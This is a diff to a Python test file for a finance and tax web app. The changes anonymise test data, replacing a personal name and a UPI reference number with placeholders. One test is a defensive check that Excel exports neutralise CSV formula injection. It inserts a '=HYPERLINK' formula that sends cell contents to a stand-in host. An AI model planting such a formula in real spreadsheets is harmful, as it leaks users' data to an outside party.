@@ -105,10 +105,10 @@ def test_raw_transactions_are_immutable_via_api(client):
 def test_confirm_and_make_rule(client):
     client.post("/api/imports", files={"file": ("a.csv", io.BytesIO(KOTAK_CSV.encode()))}, data={"account_id": 1})
     txs = client.get("/api/transactions", params={"fy": FY}).json()
-    rahul = next(t for t in txs if "RAHUL" in t["raw_description"])
+    example_person = next(t for t in txs if "EXAMPLE PERSON" in t["raw_description"])
     cats = client.get("/api/categories").json()
     prof = next(c for c in cats if c["treatment"] == "profession")
-    r = client.patch(f"/api/transactions/{rahul['id']}/classification",
+    r = client.patch(f"/api/transactions/{example_person['id']}/classification",
                      json={"category_id": prof["id"], "make_rule": True, "note": "Consulting invoice #12"})
     assert r.json()["rule_id"]
     est = client.get(f"/api/tax/{FY}").json()["estimate"]
@@ -126,7 +126,7 @@ def test_excel_formula_injection_neutralised(client):
 
     from .conftest import KOTAK_CSV
 
-    evil = KOTAK_CSV.replace("UPI/SWIGGY/509312345678/food", '=HYPERLINK("http://x.example/?"&A1)')
+    evil = KOTAK_CSV.replace("UPI/SWIGGY/000000000001/food", '=HYPERLINK("http://x.example/?"&A1)')
     client.post("/api/imports", files={"file": ("e.csv", io.BytesIO(evil.encode()))}, data={"account_id": 1})
     r = client.post(f"/api/reports/{FY}/excel")
     wb = openpyxl.load_workbook(io.BytesIO(r.content))
